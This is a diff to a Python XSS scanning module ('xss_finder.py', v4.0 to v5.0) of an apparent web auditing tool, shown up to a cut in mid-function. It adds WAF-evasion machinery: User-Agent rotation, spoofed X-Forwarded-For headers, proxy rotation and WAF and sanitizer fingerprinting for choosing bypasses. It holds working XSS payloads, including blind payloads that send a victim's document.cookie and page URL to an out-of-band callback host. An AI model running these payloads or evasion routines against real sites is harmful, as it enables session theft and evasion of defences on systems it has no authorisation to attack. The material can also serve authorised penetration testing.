@@ -1,64 +1,78 @@
 #!/usr/bin/env python3
 r"""
-auditing_tools/xss_finder.py — Cross-Site Scripting Auditor (v4.0)
+auditing_tools/xss_finder.py — Cross-Site Scripting Auditor (v5.0)
 ═══════════════════════════════════════════════════════════════════════════════
 
-Comprehensive XSS detection for Argus, with self-hosted OOB verification.
+Military-grade XSS detection with WAF evasion, sanitizer fingerprinting,
+CSP-aware payload selection, chains, and confirmed-only output.
 
-v4.0 — Huginn OOB integration + expanded coverage
+SAFETY MODEL
+────────────
+Every target request flows through `EvasionSession`:
+  • Jittered pacing
+  • User-Agent + X-Forwarded-For rotation
+  • Optional proxy rotation
+  • Exponential back-off on 403/406/429/503
+  • 60-second cool-down after a WAF block page
 
-  HUGINN INTEGRATION (the headline):
-    • Blind XSS findings are now first-class: they land in findings[] with
-      confirmed=0, then get upgraded to confirmed=1 (severity=CRITICAL,
-      confidence=99) when Huginn fires a callback. That's the difference
-      between "payload plausible" and "payload proven."
-    • _new_huginn_token() emits 32-hex tokens compatible with check.php's
-      preg_replace('/[^a-f0-9]/i') + strlen>=16 gate.
-    • Path mode by default (oast.example.com/huginn-<token>/) — no wildcard
-      TLS cert required, proven against oast.beardedviking.org.
-    • Subdomain mode available via --huginn-mode subdomain.
-    • verify_blind_findings() polls check.php?token=<hex> and updates the
-      JSON report + DB in place. Idempotent — safe to run repeatedly.
-    • CLI: --verify-oob runs the poller standalone on an existing scan.
+CONFIRMATION MODEL
+──────────────────
+  REFLECTED — payload appears byte-identical in response AND survives with
+              executable punctuation intact (()"`<>), AND reflection is
+              consistent across 2 probes (multi-fidelity).
 
-  EXPANDED DETECTION:
-    • SVG XSS (image/svg+xml) and XML XSS (text/xml, application/xml)
-      are now content-type aware; payloads unchanged, evidence labeled.
-    • JSONP callback injection: detects callback/jsonp/cb parameters and
-      flags unquoted reflection (classic JSON hijack → XSS primitive).
-    • DOM analysis: jQuery < 3.5 detection (CVE-2020-11022/11023 territory),
-      dangerous sink highlighting, indent-proximity heuristic retained.
-    • Encoding *type* is now reported: entity_named, entity_decimal,
-      entity_hex, url_encoded, js_escape, unicode_escape, stripped.
+  STORED    — marker submitted via injection surface reappears on revisit
+              URL in an executable context.
 
-  PAYLOAD EXPANSION:
-    • Context payloads: added SVG-native vectors, mathML chains, and a
-      polyglot for unknown-context injection points.
-    • WAF variants: added entity-quoted, JS \u{...} codepoint, backtick
-      string, hex-entity quotes, and null-byte variants.
+  BLIND     — Huginn OOB callback confirmed (upgraded to CRITICAL).
 
-  ROBUSTNESS:
-    • Per-surface error isolation: one malformed surface can't abort the
-      scan; failures go to results[] with an error field.
-    • Partial results: written even on KeyboardInterrupt (was: lost).
-    • Session body cap retained (2 MB).
+  DOM       — source→sink dataflow detected with proximity+indent heuristic.
 
-  COMPATIBILITY (unchanged from v3.1):
-    • run_xss_scan(urls_file, outdir, *, ...) signature preserved.
-    • All output files + DB schema shape preserved.
-    • New kwargs (oob_base_url, huginn_mode, oob_poll_wait) default to
-      sane values so existing main.py calls keep working.
+  JSONP     — callback parameter reflected unquoted at start of response.
 
-Honesty note (unchanged):
-  Without a headless browser, this module cannot prove JavaScript executed.
-  It proves the payload SURVIVED UNENCODED in a context where a browser
-  WOULD execute it — AND, for blind XSS, it proves the payload reached an
-  execution environment that made a network callback to *your* server.
-  That second signal is strictly stronger than survival evidence.
+  HEADER    — injected header reflected unencoded in a JS-executable context.
 
-Integration:
-  main.py → run_one("xss") → run_xss_scan(urls_file, outdir,
-                                          scan_id=_CURRENT_SCAN_ID)
+  CSP       — reported as finding but never drives a CRITICAL classification
+              by itself; it amplifies severity of other findings.
+
+SEVERITY (impact-driven)
+────────────────────────
+  CRITICAL   Blind confirmed via OOB, stored XSS in executable context,
+             reflected with intact punctuation, DOM with confirmed jQuery
+             CVE chain, or confirmed XSS against known-insecure CSP.
+  HIGH       Reflected with partial punctuation, JSONP injection confirmed,
+             header reflection in executable context, DOM source-sink with
+             high confidence (≥75).
+  MEDIUM     Reflection with encoded punctuation, DOM source-sink low
+             confidence, CSP allows 'unsafe-inline' or wildcard, missing
+             base-uri / object-src.
+  LOW        Marker reflection only (payload was filtered).
+  INFO       CSP report-only header, information-disclosure notes.
+
+CHAINS
+──────
+  xss-reflected         confirmed reflected XSS
+  xss-stored            confirmed stored XSS
+  xss-blind             confirmed blind XSS via OOB
+  xss-dom               DOM XSS surface with confirmed source→sink
+  xss-waf-bypass        WAF initially blocked but variant succeeded
+  xss-jsonp             JSONP callback injection
+  xss-csp-bypass        confirmed XSS against CSP that can be bypassed
+  xss-csp-missing       no CSP — MITM amplification
+  xss-cookie-theft      XSS + session cookie missing HttpOnly
+  xss-waf-protected     WAF actively blocks XSS payloads
+
+OUTPUTS
+───────
+  xss_findings.json       every finding
+  xss_confirmed.json      HIGH / CRITICAL only
+  xss_chains.json         structured chain records
+  xss_evidence/           raw baseline + reflected bodies per confirmed finding
+  xss_candidates.txt      flat triage
+  xss_confirmed.txt       confirmed flat triage
+  xss_dom.txt             DOM-specific
+  xss_blind.txt           blind payloads (for manual deployment + OOB verify)
+  xss_csp.txt             CSP-specific
 """
 
 from __future__ import annotations
@@ -79,6 +93,7 @@ import urllib.parse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
+from enum import Enum
 from pathlib import Path
 from typing import Optional
 
@@ -110,13 +125,11 @@ except ImportError:
 
 
 def _cfg(key: str, default=None):
-    if not CFG_LOADED:
-        return default
-    return getattr(CFG, key, default)
+    return getattr(CFG, key, default) if CFG_LOADED else default
 
 
 def _xss_settings() -> dict:
-    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("xss", {})
+    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("xss", {}) or {}
     return {
         "rate_limit":   entry.get("rate_limit", 3),
         "concurrency":  entry.get("concurrency", 3),
@@ -126,43 +139,31 @@ def _xss_settings() -> dict:
         "test_dom":     entry.get("test_dom", True),
         "test_headers": entry.get("test_headers", False),
         "verify_tls":   entry.get("verify_tls", _cfg("VERIFY_TLS", False)),
+        "jitter":       entry.get("jitter", 0.4),
+        "proxies":      entry.get("proxies", []),
     }
 
 
 def _oob_settings() -> dict:
-    """
-    Read OOB config once, resolved. Never fails — returns empty domain if
-    OOB isn't configured, and callers treat that as "no blind testing."
-    """
     mode = (_cfg("OAST_MODE", "huginn") or "huginn").lower()
     domain = (_cfg("OAST_DOMAIN", "") or "").strip()
     base_url = (_cfg("OAST_BASE_URL", "") or "").strip()
     read_key = _cfg("OAST_KEY", "") or _cfg("HUGINN_READ_KEY", "") or ""
-
     if mode == "disabled" or not domain:
-        return {"mode": "disabled", "base_url": "", "read_key": "",
-                "domain": ""}
-
+        return {"mode": "disabled", "base_url": "", "read_key": "", "domain": ""}
     if base_url:
         if not base_url.startswith(("http://", "https://")):
             base_url = "https://" + base_url
     elif domain:
         base_url = "https://" + domain
-
-    return {
-        "mode":     mode,
-        "domain":   domain,
-        "base_url": base_url.rstrip("/"),
-        "read_key": read_key,
-    }
+    return {"mode": mode, "domain": domain,
+            "base_url": base_url.rstrip("/"), "read_key": read_key}
 
 
 def _target_headers() -> dict[str, str]:
     h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
     if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
-        auth_hdrs = getattr(CFG, "AUTH_HEADERS", {}) or {}
-        if auth_hdrs:
-            h.update(auth_hdrs)
+        h.update(getattr(CFG, "AUTH_HEADERS", {}) or {})
     return h
 
 
@@ -171,24 +172,80 @@ def _db_now() -> str:
 
 
 # ═════════════════════════════════════════════════════════════════════════════
+#  SEVERITY
+# ═════════════════════════════════════════════════════════════════════════════
+
+class Severity(str, Enum):
+    INFO     = "INFO"
+    LOW      = "LOW"
+    MEDIUM   = "MEDIUM"
+    HIGH     = "HIGH"
+    CRITICAL = "CRITICAL"
+
+    @property
+    def rank(self) -> int:
+        return {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}[self.value]
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  WAF DETECTION
+# ═════════════════════════════════════════════════════════════════════════════
+
+WAF_SIGNATURES: dict[str, dict] = {
+    "Cloudflare":  {"headers": ["cf-ray", "__cf_bm", "cf-cache-status"],
+                    "body": ["Attention Required! | Cloudflare", "cloudflare-nginx"]},
+    "Akamai":      {"headers": ["akamai-grn", "x-akamai-transformed", "_abck"],
+                    "body": ["Access Denied", "Reference&#32;&#35;"]},
+    "Imperva":     {"headers": ["x-iinfo", "incap_ses", "_Incapsula_Resource"],
+                    "body": ["Pardon Our Interruption", "Incapsula incident ID"]},
+    "AWS WAF":     {"headers": ["x-amzn-requestid", "x-amzn-errortype", "awselb"],
+                    "body": ["Request blocked", "AWS WAF"]},
+    "F5 BIG-IP":   {"headers": ["x-wa-info", "bigipserver"],
+                    "body": ["The requested URL was rejected", "F5 Networks"]},
+    "Sucuri":      {"headers": ["x-sucuri-id", "x-sucuri-cache"],
+                    "body": ["Sucuri WebSite Firewall", "Access Denied - Sucuri"]},
+    "DataDome":    {"headers": ["x-datadome", "datadome"],
+                    "body": ["datadome", "captcha-delivery"]},
+    "ModSecurity": {"headers": ["x-mod-security"],
+                    "body": ["ModSecurity", "Not Acceptable!"]},
+}
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
+]
+
+
+@dataclass
+class WAFReport:
+    vendor: str = "unknown"
+    confidence: int = 0
+    signals: list[str] = field(default_factory=list)
+    blocked: bool = False
+
+
+# ═════════════════════════════════════════════════════════════════════════════
 #  CONSTANTS
 # ═════════════════════════════════════════════════════════════════════════════
 
-FINDING_SCHEMA_VERSION = 2       # bumped: blind findings in findings[], oob fields
+FINDING_SCHEMA_VERSION = 3       # v5.0: severity enum, chains, evidence
 
 DEFAULT_TIMEOUT        = 12
 BASELINE_SAMPLES       = 2
 REQUEST_SLEEP          = 0.08
 MAX_URLS               = 5000
 MAX_CONTEXT_PAYLOADS   = 6
+MAX_CONTEXT_PAYLOADS_AGGRESSIVE = 12
 MAX_DOM_FILES          = 40
 MAX_STORED_PAGES       = 15
 MAX_RESPONSE_BYTES     = 2_000_000
 MARKER_PREFIX          = "argusxss"
+MULTI_FIDELITY_ATTEMPTS = 2      # fire payload N times to confirm reflection
 
-HUGINN_TOKEN_BYTES     = 16      # 32 hex chars — over check.php's 16-char min
-HUGINN_POLL_INTERVAL   = 8       # seconds between polls (in verify)
-HUGINN_POLL_TIMEOUT    = 120     # default per-token max wait
+HUGINN_TOKEN_BYTES     = 16
+HUGINN_POLL_INTERVAL   = 8
+HUGINN_POLL_TIMEOUT    = 120
 
 NON_EXECUTABLE_CONTENT_PREFIXES = (
     "image/png", "image/jpeg", "image/gif", "image/webp",
@@ -212,29 +269,62 @@ HEADER_INJECTION_VECTORS = [
     "X-Forwarded-Host", "X-Client-IP", "Origin",
 ]
 
-WAF_SIGNATURES = {
-    "cloudflare":  ["cloudflare", "cf-ray", "__cfduid", "cf-cache"],
-    "akamai":      ["akamai", "akamai-ghost", "akamaighost"],
-    "sucuri":      ["sucuri", "x-sucuri-id", "sucuri.net"],
-    "modsecurity": ["mod_security", "modsecurity", "not acceptable"],
-    "aws_waf":     ["awswaf", "x-amzn-requestid"],
-    "imperva":     ["incap_ses", "visid_incap", "incapsula"],
-    "f5_bigip":    ["bigip", "x-wa-info", "big-ip"],
-    "barracuda":   ["barra", "barracuda"],
-}
-
 WAF_BLOCK_STATUSES = (403, 406, 429, 501)
 
-# JSONP callback parameter names (case-insensitive match against surface.param)
 JSONP_PARAM_HINTS = ("callback", "jsonp", "cb", "json_callback", "cbname", "jsoncb")
 
-# jQuery versions below this are vulnerable to html()-with-user-input chains
 JQUERY_MIN_SAFE = (3, 5, 0)
+DOMPURIFY_MIN_SAFE = (2, 3, 3)
 
+# Sanitizer fingerprinting — pick bypass strategy based on what's actually running
+SANITIZER_SIGNATURES = {
+    "DOMPurify":       [r"DOMPurify", r"purify\.isSupported", r"DOMPurify\.sanitize"],
+    "sanitize-html":   [r"sanitize-html", r"sanitizeHtml\("],
+    "Bleach":          [r"\bbleach\b", r"bleach\.clean"],
+    "OWASP Sanitizer": [r"owasp.*sanitizer", r"PolicyFactory"],
+    "Angular":         [r"angular.*sanitize", r"AngularSanitizer", r"sanitizeHtml"],
+    "XSS-Filter PHP":  [r"XSS_Filter", r"xss_clean"],
+    "AntiSamy":        [r"AntiSamy", r"antisamy"],
+    "js-xss":          [r"filterXSS", r"js-xss"],
+}
 
-# ═════════════════════════════════════════════════════════════════════════════
-#  CONTEXT-AWARE PAYLOADS
-# ═════════════════════════════════════════════════════════════════════════════
+DENIAL_MARKERS = (
+    "blocked", "forbidden", "not allowed", "invalid input",
+    "input rejected", "malicious", "waf", "sanitized",
+    "not permitted", "request denied",
+)
+
+ENCODING_CHARS = ["<", ">", '"', "'", "`", "(", ")"]
+
+ENCODED_FORMS_BY_TYPE = {
+    "entity_named":   {"<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&apos;"},
+    "entity_decimal": {"<": "&#60;", ">": "&#62;", '"': "&#34;", "'": "&#39;",
+                       "`": "&#96;", "(": "&#40;", ")": "&#41;"},
+    "entity_hex":     {"<": "&#x3c;", ">": "&#x3e;", '"': "&#x22;",
+                       "'": "&#x27;", "`": "&#x60;", "(": "&#x28;", ")": "&#x29;"},
+    "url_encoded":    {"<": "%3c", ">": "%3e", '"': "%22", "'": "%27",
+                       "`": "%60", "(": "%28", ")": "%29"},
+    "js_escape":      {'"': '\\"', "'": "\\'", "`": "\\`"},
+    "unicode_escape": {"<": "\\u003c", ">": "\\u003e", "(": "\\u0028",
+                       ")": "\\u0029"},
+}
+
+ENCODED_FORMS = {ch: [] for ch in ENCODING_CHARS}
+for _forms in ENCODED_FORMS_BY_TYPE.values():
+    for _ch, _form in _forms.items():
+        ENCODED_FORMS.setdefault(_ch, []).append(_form)
+
+CSP_BYPASS_HOSTS = [
+    "ajax.googleapis.com", "cdnjs.cloudflare.com", "cdn.jsdelivr.net",
+    "unpkg.com", "code.jquery.com", "maxcdn.bootstrapcdn.com",
+    "stackpath.bootstrapcdn.com", "www.google.com", "accounts.google.com",
+]
+
+STORED_REVISIT_PATTERNS = [
+    "/", "/profile", "/account", "/dashboard", "/settings",
+    "/comments", "/messages", "/posts", "/feed", "/notifications",
+    "/admin", "/admin/users", "/support", "/tickets",
+]
 
 CONTEXT_PAYLOADS: dict[str, list[str]] = {
     "html_body": [
@@ -243,7 +333,6 @@ CONTEXT_PAYLOADS: dict[str, list[str]] = {
         "<script>alert('{m}')</script>",
         "<details open ontoggle=alert('{m}')>",
         "<iframe srcdoc=\"<script>alert('{m}')</script>\">",
-        # mathML mtext chain — survives many filters
         "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x></textarea><img src=x onerror=alert('{m}')>",
     ],
     "attr_double": [
@@ -315,7 +404,6 @@ CONTEXT_PAYLOADS: dict[str, list[str]] = {
         "</title><svg onload=alert('{m}')>",
         "</title><img src=x onerror=alert('{m}')>",
     ],
-    # SVG and XML get their own sets — script works but the chain is different.
     "svg": [
         "<script>alert('{m}')</script>",
         "<svg xmlns='http://www.w3.org/2000/svg' onload=alert('{m}')>",
@@ -326,7 +414,6 @@ CONTEXT_PAYLOADS: dict[str, list[str]] = {
         "<![CDATA[<script>alert('{m}')</script>]]>",
     ],
     "unknown": [
-        # Polyglot: works in multiple contexts simultaneously
         "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{m}'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{m}')//>\\x3e",
         "<svg onload=alert('{m}')>",
     ],
@@ -357,51 +444,6 @@ DOM_SINKS = [
     "src", "srcdoc", "href",
 ]
 
-DENIAL_MARKERS = (
-    "blocked", "forbidden", "not allowed", "invalid input",
-    "input rejected", "malicious", "waf", "sanitized",
-    "not permitted", "request denied",
-)
-
-ENCODING_CHARS = ["<", ">", '"', "'", "`", "(", ")"]
-
-# Split by encoding type so evidence can report *which* encoding happened.
-ENCODED_FORMS_BY_TYPE = {
-    "entity_named":   {"<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&apos;"},
-    "entity_decimal": {"<": "&#60;", ">": "&#62;", '"': "&#34;", "'": "&#39;",
-                       "`": "&#96;", "(": "&#40;", ")": "&#41;"},
-    "entity_hex":     {"<": "&#x3c;", ">": "&#x3e;", '"': "&#x22;",
-                       "'": "&#x27;", "`": "&#x60;", "(": "&#x28;", ")": "&#x29;"},
-    "url_encoded":    {"<": "%3c", ">": "%3e", '"': "%22", "'": "%27",
-                       "`": "%60", "(": "%28", ")": "%29"},
-    "js_escape":      {'"': '\\"', "'": "\\'", "`": "\\`"},
-    "unicode_escape": {"<": "\\u003c", ">": "\\u003e", "(": "\\u0028",
-                       ")": "\\u0029"},
-}
-
-# Flat set for backwards-compat with code that expects ENCODED_FORMS[ch]
-ENCODED_FORMS = {ch: [] for ch in ENCODING_CHARS}
-for _forms in ENCODED_FORMS_BY_TYPE.values():
-    for _ch, _form in _forms.items():
-        ENCODED_FORMS.setdefault(_ch, []).append(_form)
-
-CSP_BYPASS_HOSTS = [
-    "ajax.googleapis.com", "cdnjs.cloudflare.com", "cdn.jsdelivr.net",
-    "unpkg.com", "code.jquery.com", "maxcdn.bootstrapcdn.com",
-    "stackpath.bootstrapcdn.com", "www.google.com", "accounts.google.com",
-]
-
-STORED_REVISIT_PATTERNS = [
-    "/", "/profile", "/account", "/dashboard", "/settings",
-    "/comments", "/messages", "/posts", "/feed", "/notifications",
-    "/admin", "/admin/users", "/support", "/tickets",
-]
-
-# ── Blind (OOB) payload templates ─────────────────────────────────────────
-# All placeholders: {oob} = full payload URL (path or subdomain mode)
-# Huginn serves JSON on the base path, which is fine — <script src> still
-# fires the request even though the JSON isn't valid JS.
-
 _BLIND_FETCH = (
     "<script>(function(){{"
     "var d={{u:location.href.slice(0,500),c:document.cookie.slice(0,2000),"
@@ -414,7 +456,6 @@ _BLIND_FETCH = (
     "body:JSON.stringify(d)}}).catch(function(){{}})"
     "}})();</script>"
 )
-
 _BLIND_IMAGE = (
     "<script>(new Image()).src='{oob}?c='"
     "+encodeURIComponent(document.cookie.slice(0,1500))"
@@ -422,18 +463,15 @@ _BLIND_IMAGE = (
     "+'&d='+encodeURIComponent(document.domain)"
     "</script>"
 )
-
 _BLIND_SVG = (
     "<svg onload=\"fetch('{oob}?c='+encodeURIComponent(document.cookie)"
     "+'&u='+encodeURIComponent(location.href))\">"
 )
-
 _BLIND_IMG_ATTR = (
     "<img src='{oob}?c=x' "
     "onerror=\"this.src='{oob}?c='+encodeURIComponent(document.cookie)"
     "+'&u='+encodeURIComponent(location.href)\">"
 )
-
 _BLIND_SCRIPT_SRC = "<script src='{oob}'></script>"
 
 BLIND_PAYLOAD_TEMPLATES = [
@@ -460,13 +498,20 @@ class Baseline:
     content_type: str = ""
     median_time: float = 0.0
     waf: str = ""
+    nosniff: bool = False
+    sanitizer: str = ""
+    sanitizer_version: str = ""
 
     def to_dict(self) -> dict:
         return {
             "url": self.url, "param": self.param, "location": self.location,
             "status": self.status, "length": self.length,
             "median_time": round(self.median_time, 3),
+            "content_type": self.content_type,
             "waf": self.waf,
+            "nosniff": self.nosniff,
+            "sanitizer": self.sanitizer,
+            "sanitizer_version": self.sanitizer_version,
         }
 
 
@@ -476,7 +521,7 @@ class XSSFinding:
     param: str
     xss_type: str
     context: str = ""
-    severity: str = "MEDIUM"
+    severity: Severity = Severity.MEDIUM
     confidence: int = 50
     confirmed: bool = False
     payload: str = ""
@@ -487,16 +532,16 @@ class XSSFinding:
     survived_chars: list[str] = field(default_factory=list)
     param_location: str = "query"
     http_status: int = 0
+    chain_ids: list[str] = field(default_factory=list)
+    waf_vendor: str = ""
     auth_enabled: bool = False
     first_seen: str = ""
     details: dict = field(default_factory=dict)
 
     @property
     def finding_hash(self) -> str:
-        raw = (
-            f"{self.target}|{self.param}|{self.param_location}|"
-            f"{self.xss_type}|{self.context}"
-        )
+        raw = (f"{self.target}|{self.param}|{self.param_location}|"
+               f"{self.xss_type}|{self.context}")
         return hashlib.sha256(raw.encode()).hexdigest()
 
     @property
@@ -512,9 +557,9 @@ class XSSFinding:
             "param_location": self.param_location,
             "xss_type":       self.xss_type,
             "context":        self.context,
-            "severity":       self.severity,
+            "severity":       self.severity.value,
             "confidence":     self.confidence,
-            "confirmed":      1 if self.confirmed else 0,
+            "confirmed":      self.confirmed,
             "payload":        (self.payload or "")[:2048],
             "marker":         self.marker,
             "evidence":       (self.evidence or "")[:1024],
@@ -522,10 +567,32 @@ class XSSFinding:
             "encoded_chars":  self.encoded_chars,
             "survived_chars": self.survived_chars,
             "http_status":    self.http_status,
+            "chain_ids":      self.chain_ids,
+            "waf_vendor":     self.waf_vendor,
             "details":        self.details,
-            "auth_enabled":   1 if self.auth_enabled else 0,
+            "auth_enabled":   self.auth_enabled,
             "finding_hash":   self.finding_hash,
             "first_seen":     self.first_seen or _db_now(),
+        }
+
+
+@dataclass
+class XSSChain:
+    chain_id: str
+    name: str
+    severity: Severity
+    steps: list[str]
+    finding_hashes: list[str] = field(default_factory=list)
+    evidence: str = ""
+
+    def to_dict(self) -> dict:
+        return {
+            "chain_id":       self.chain_id,
+            "name":           self.name,
+            "severity":       self.severity.value,
+            "steps":          self.steps,
+            "finding_hashes": self.finding_hashes,
+            "evidence":       self.evidence[:600],
         }
 
 
@@ -534,8 +601,9 @@ class XSSFinding:
 # ═════════════════════════════════════════════════════════════════════════════
 
 class SharedRateLimiter:
-    def __init__(self, rate_limit: float, backoff_max: float = 30.0):
+    def __init__(self, rate_limit: float, jitter: float = 0.0, backoff_max: float = 30.0):
         self.min_interval = 1.0 / rate_limit if rate_limit and rate_limit > 0 else 0.0
+        self.jitter = max(0.0, jitter)
         self._last = 0.0
         self._lock = threading.Lock()
         self._backoff_until = 0.0
@@ -544,12 +612,13 @@ class SharedRateLimiter:
         self._block_lock = threading.Lock()
 
     def wait(self) -> None:
-        if self.min_interval <= 0:
+        if self.min_interval <= 0 and self.jitter <= 0:
             return
         with self._lock:
             while True:
+                interval = self.min_interval + random.uniform(0, self.jitter)
                 now = time.monotonic()
-                wait_until = max(self._last + self.min_interval, self._backoff_until)
+                wait_until = max(self._last + interval, self._backoff_until)
                 if now >= wait_until:
                     break
                 time.sleep(wait_until - now)
@@ -559,10 +628,8 @@ class SharedRateLimiter:
         with self._block_lock:
             if status in (429, 503):
                 self._consecutive_blocks += 1
-                backoff = min(
-                    self._backoff_max,
-                    (2 ** min(self._consecutive_blocks, 6)) * 0.25,
-                )
+                backoff = min(self._backoff_max,
+                              (2 ** min(self._consecutive_blocks, 6)) * 0.25)
                 self._backoff_until = time.monotonic() + backoff
                 log.debug(f"rate-limiter: backoff {backoff:.2f}s after {status}")
             elif 200 <= status < 400:
@@ -572,52 +639,155 @@ class SharedRateLimiter:
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  SESSION
+#  EVASION SESSION
 # ═════════════════════════════════════════════════════════════════════════════
 
-class Session:
+@dataclass
+class EvasionProfile:
+    rate_limit: float = 3.0
+    jitter: float = 0.4
+    rotate_ua: bool = True
+    rotate_xff: bool = True
+    proxies: list[str] = field(default_factory=list)
+    backoff_codes: tuple[int, ...] = (403, 406, 429, 503)
+    max_backoff: float = 30.0
+    cooldown_after_block: float = 60.0
+
+
+class EvasionSession:
     def __init__(
-        self, limiter: SharedRateLimiter, headers: dict, timeout: int,
+        self, profile: EvasionProfile, headers: dict, timeout: int,
         *, verify_tls: bool = False, max_bytes: int = MAX_RESPONSE_BYTES,
     ):
+        self.profile = profile
+        self.timeout = timeout
+        self.max_bytes = max_bytes
         self.session = requests.Session()
         self.session.verify = verify_tls
         if headers:
             self.session.headers.update(headers)
-        self.session.headers.setdefault("User-Agent", "Argus-XSS-Auditor/4.0")
+        self.session.headers.setdefault("User-Agent", "Argus-XSS-Auditor/5.0")
         self.session.headers.setdefault(
             "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
         )
-        self._limiter = limiter
-        self.timeout = timeout
-        self.max_bytes = max_bytes
         if not verify_tls:
             log.warning("TLS verification disabled (verify_tls=False) — engagement-only")
 
+        self._min_interval = 1.0 / profile.rate_limit if profile.rate_limit > 0 else 0.0
+        self._last = 0.0
+        self._backoff = 0.0
+        self._cooldown_until = 0.0
+        self._proxy_idx = 0
+        self._ua_idx = 0
+        self._xff_counter = 0
+        self._lock = threading.Lock()
+
+    def __enter__(self): return self
+    def __exit__(self, *exc):
+        try: self.session.close()
+        except Exception: pass
+
+    def _pace(self):
+        now = time.monotonic()
+        if now < self._cooldown_until:
+            time.sleep(self._cooldown_until - now)
+        interval = self._min_interval + random.uniform(0, self.profile.jitter)
+        elapsed = time.monotonic() - self._last
+        if elapsed < interval:
+            time.sleep(interval - elapsed)
+        if self._backoff > 0:
+            time.sleep(self._backoff)
+        self._last = time.monotonic()
+
+    def _rotate(self):
+        with self._lock:
+            if self.profile.rotate_ua:
+                self.session.headers["User-Agent"] = USER_AGENTS[
+                    self._ua_idx % len(USER_AGENTS)
+                ]
+                self._ua_idx += 1
+            if self.profile.rotate_xff:
+                self._xff_counter += 1
+                o = self._xff_counter % 254 + 1
+                self.session.headers["X-Forwarded-For"] = f"10.0.{o}.{o}"
+                self.session.headers["X-Real-IP"] = f"10.0.{o}.{o}"
+
+    def _proxy(self) -> Optional[dict]:
+        if not self.profile.proxies:
+            return None
+        with self._lock:
+            p = self.profile.proxies[self._proxy_idx % len(self.profile.proxies)]
+            self._proxy_idx += 1
+        return {"http": p, "https": p}
+
     def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
-        self._limiter.wait()
+        self._pace()
+        self._rotate()
+        proxy = self._proxy()
         try:
             resp = self.session.request(
                 method, url,
                 timeout=kwargs.pop("timeout", self.timeout),
                 allow_redirects=kwargs.pop("allow_redirects", False),
-                stream=True,
-                **kwargs,
+                stream=True, proxies=proxy, **kwargs,
             )
         except requests.RequestException as e:
             log.debug(f"request failed: {method} {_redact_url(url)}: {e}")
             return None
 
-        self._limiter.note_response(resp.status_code)
-
         try:
             resp._content = resp.raw.read(self.max_bytes, decode_content=True)
         except Exception:
             resp._content = b""
+
+        if resp.status_code in self.profile.backoff_codes:
+            self._backoff = min(self.profile.max_backoff,
+                                max(1.0, self._backoff * 2 or 1.0))
+            low = (resp.text or "")[:2000].lower()
+            if any(w in low for w in ("blocked", "firewall", "captcha", "denied")):
+                self._cooldown_until = time.monotonic() + self.profile.cooldown_after_block
+                log.warning("  WAF block — cooling down %.0fs",
+                            self.profile.cooldown_after_block)
+        elif resp.status_code < 400:
+            self._backoff = 0.0
         return resp
 
     def get(self, url: str, **kwargs):
         return self.request("GET", url, **kwargs)
+
+    def benign_get(self, url: str) -> Optional[requests.Response]:
+        try:
+            return self.session.get(url, timeout=self.timeout, verify=False)
+        except requests.RequestException:
+            return None
+
+
+def detect_waf(session: EvasionSession, url: str) -> WAFReport:
+    report = WAFReport()
+    try:
+        resp = session.benign_get(url)
+    except Exception:
+        return report
+    if resp is None:
+        return report
+    header_blob = " ".join(f"{k.lower()}:{v}" for k, v in resp.headers.items()).lower()
+    body_blob = _body(resp)[:4000].lower()
+    for vendor, sig in WAF_SIGNATURES.items():
+        hits = [f"header:{h}" for h in sig["headers"] if h.lower() in header_blob]
+        hits += [f"body:{b[:40]}" for b in sig["body"] if b.lower() in body_blob]
+        if hits:
+            report.vendor = vendor
+            report.signals = hits
+            report.confidence = min(100, 50 + 15 * len(hits))
+            break
+    if resp.status_code in WAF_BLOCK_STATUSES:
+        low = (resp.text or "")[:2000].lower()
+        if any(w in low for w in ("blocked", "denied", "firewall", "captcha")):
+            report.blocked = True
+            if report.vendor == "unknown":
+                report.vendor = "generic-waf"
+                report.confidence = 40
+    return report
 
 
 # ═════════════════════════════════════════════════════════════════════════════
@@ -635,10 +805,7 @@ def _redact_url(url: str, max_len: int = 240) -> str:
         if not parsed.query:
             return url[:max_len]
         pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
-        redacted = [
-            (k, "***" if _SECRET_PARAM_RE.search(k) else v)
-            for k, v in pairs
-        ]
+        redacted = [(k, "***" if _SECRET_PARAM_RE.search(k) else v) for k, v in pairs]
         clean = urllib.parse.urlunparse(
             parsed._replace(query=urllib.parse.urlencode(redacted, safe=""))
         )
@@ -650,18 +817,17 @@ def _redact_url(url: str, max_len: int = 240) -> str:
 def _load_urls(input_file: Path) -> list[str]:
     if not input_file.exists():
         return []
-    urls: list[str] = []
-    seen: set[str] = set()
+    urls, seen = [], set()
     for line in input_file.read_text().splitlines():
         line = line.strip()
         if not line or line.startswith("#"):
             continue
-        token = line.split()[0]
-        if not token.startswith(("http://", "https://")):
-            token = "https://" + token
-        if token not in seen:
-            seen.add(token)
-            urls.append(token)
+        tok = line.split()[0]
+        if not tok.startswith(("http://", "https://")):
+            tok = "https://" + tok
+        if tok not in seen:
+            seen.add(tok)
+            urls.append(tok)
     return urls
 
 
@@ -692,36 +858,18 @@ def _new_marker() -> str:
 
 
 def _new_huginn_token() -> str:
-    """
-    32-hex-char token. Huginn's check.php sanitises with
